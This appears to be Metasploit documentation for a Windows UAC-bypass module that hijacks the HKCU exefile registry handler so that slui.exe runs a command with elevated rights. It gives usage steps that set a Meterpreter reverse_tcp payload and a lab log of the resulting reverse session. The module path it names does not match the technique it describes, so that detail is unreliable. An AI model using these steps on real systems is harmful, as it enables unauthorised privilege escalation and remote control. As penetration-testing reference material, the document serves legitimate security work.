## Intro

  This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under
  the Current User hive, and inserting a custom command that will get invoked when
  any binary (.exe) application is launched. But slui.exe is an auto-elevated binary that is
  vulnerable to file handler hijacking. When we run slui.exe with changed Registry key
  (HKCU:\Software\Classes\exefile\shell\open\command), it will run our custom command as Admin
  instead of slui.exe.

  The module modifies the registry in order for this exploit to work. The modification is
  reverted once the exploitation attempt has finished.
	
  The module does not require the architecture of the payload to match the OS. If
  specifying EXE::Custom your DLL should call ExitProcess() after starting the
  payload in a different process.

## Usage
	
  1. First we need to obtain a session on the target system.
  2. Load module: `use exploit/windows/local/bypassuac_comhijack`
  3. Set the `payload`: `set payload windows/x64/meterpreter/reverse_tcp`
  4. Configure the `payload`.

## Scenario

```
msf exploit(multi/handler) > 
[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 1p4jbbka) Encoded stage with x86/shikata_ga_nai
[*] https://192.168.0.30:443 handling request from 192.168.0.33; (UUID: 1p4jbbka) Staging x86 payload (180854 bytes) ...
[*] Meterpreter session 1 opened (192.168.0.30:443 -> 192.168.0.33:49775) at 2018-04-07 09:59:42 +0200

msf exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  WIN10-01\user01 @ WIN10-01  192.168.0.30:443 -> 192.168.0.33:49775 (192.168.0.33)

msf exploit(multi/handler) >




```
